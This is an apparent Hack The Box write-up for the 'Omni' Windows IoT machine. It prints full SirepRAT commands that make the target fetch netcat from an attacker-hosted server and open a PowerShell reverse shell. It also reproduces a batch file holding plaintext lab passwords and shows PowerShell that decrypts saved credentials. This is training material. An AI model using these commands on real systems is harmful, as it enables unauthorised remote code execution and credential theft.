> We started of by enumerating the box with AutoRecon found that it was running Windows Device Portal which had a vulnerability that we could exploit using SirepRAT. From there, we got netcat onto the box using SirepRAT and got a reverse shell as omni user. We enumerated through the file system and found a bat file which contained credentials.

-------

## Enumeration

Recently, I have been using AutoRecon which was created by [Tib3rius](https://github.com/Tib3rius/AutoRecon).

### Nmap

I ran `sudo autorecon $IP` so that we can run with a UDP scan as well.

__AutoRecon quick TCP scan__

`nmap -vv --reason -Pn -sV -sC --version-all -oN /htb/omni/results/10.10.10.204/scans/_quick_tcp_nmap.txt -oX /htb/omni/results/10.10.10.204/scans/xml/_quick_tcp_nmap.xml 10.10.10.204`

```
[SNIP]

[SNIP]
```

### Website

When navigating to the website on `port 8080`, we got greeted with an authentication popup. Using basic default credentials yielded nothing.

Moved on to figuring out what Windows Device Portal was:

Googling [Windows Device Portal](https://docs.microsoft.com/en-us/windows/uwp/debug-test-perf/device-portal):

> The Windows Device Portal (WDP) is a web server included with Windows devices that lets you configure and manage the settings for the device over a network or USB connection (local connections are also supported on devices with a web browser).

After some more googling, we found a vulnerablility pertaining to Windows Device Portal [here](https://github.com/SafeBreach-Labs/SirepRAT)

> The method is exploiting the Sirep Test Service that’s built in and running on the official images offered at Microsoft’s site. This service is the client part of the HLK setup one may build in order to perform driver/hardware tests on the IoT device. It serves the Sirep/WPCon/TShell protocol.

We need our own Netcat binary which can be downloaded [here](https://eternallybored.org/misc/netcat/)

We'll have to start our python server:

```
Python2: python -m SimpleHTTPServer

Python3: python3 -m http.server
```

Then issue the following command to get netcat onto the box:

```
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c powershell Invoke-Webrequest -OutFile C:\\Users\\Public\\nc64.exe -Uri http://$LHOST:$PORT/nc64.exe" --v
```

Once this command completed successfully, you'll have to invoke using the following:

```
python3 SirepRAT.py 10.10.10.204 LaunchCommandWithOutput --return_output --cmd "C:\Windows\System32\cmd.exe" --args "/c C:\\Users\\Public\\nc64.exe $LHOST $LPORT -e powershell.exe" --v
```

Make sure you setup your netcat listener to capture it.

![netcat](/assets/img/htb/omni/netcat.png)

We are unable to read the `user.txt` file at this point so further enumeration is needed.

After gallivanting around the file system, I came across a hidden `BAT` file, which contained credentials.

![hidden](/assets/img/htb/omni/hidden.png)

__r.bat__

```
@echo off

:LOOP

for /F "skip=6" %%i in ('net localgroup "administrators"') do net localgroup "administrators" %%i /delete

net user app mesh5143
net user administrator _1nt3rn37ofTh1nGz

ping -n 3 127.0.0.1

cls

GOTO :LOOP

:EXIT
```

Using the first credentials as `app`, we were able to login to the portal.

![app](/assets/img/htb/omni/app.png)

Under `Processes` then `Run command`, we are able to execute commands.

We can use this to make a call to our netcat.

![appnetcat](/assets/img/htb/omni/appnetcat.png)

The `user.txt` file seems to be encrypted:

![usertxt](/assets/img/htb/omni/userencrypt.png)

There is an excellent article detailing how to retrieve the password [here](https://mcpmag.com/articles/2017/07/20/save-and-read-sensitive-data-with-powershell.aspx)

```
$credential = Import-CliXml -Path "path\to\file"

then

$credential.GetNetworkCredential().Password
```

![appcred](/assets/img/htb/omni/appcred.png)

Now how do we get Admin, if you remember from the `r.bat` file we already have administrator credentials. All we have to do is sign in as administrator and repeat how we got `app` shell.

You may find that there is no logout button available, a work around is to open a private window through firefox or what ever browser you happen to be using.

![rootcommand](/assets/img/htb/omni/rootcommand.png)

![rootnetcat](/assets/img/htb/omni/rootnetcat.png)

Again, we'll just do the same thing to retrieve the root flag.
